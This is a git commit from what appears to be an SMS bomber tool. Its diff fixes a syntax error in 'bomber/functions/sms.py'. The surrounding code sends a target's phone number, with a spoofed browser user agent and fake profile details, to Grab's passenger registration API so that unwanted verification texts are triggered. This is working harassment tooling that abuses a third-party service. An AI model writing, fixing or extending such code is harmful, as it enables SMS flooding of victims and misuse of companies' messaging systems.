75f3f808bf2eae74b7fda25f0f8aea2dbf4f7c0a
Abolfazl Farzin <96248859+Craboli83@users.noreply.github.com>
2022-05-25 23:29:17 +0430

    Update sms.py

--- bomber/functions/sms.py
+++ bomber/functions/sms.py
@@ -2,7 +2,7 @@ import requests
 import threading
 import asyncio
 
-await def sent(phone):
+async def sent(phone):
     try:
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
         return True
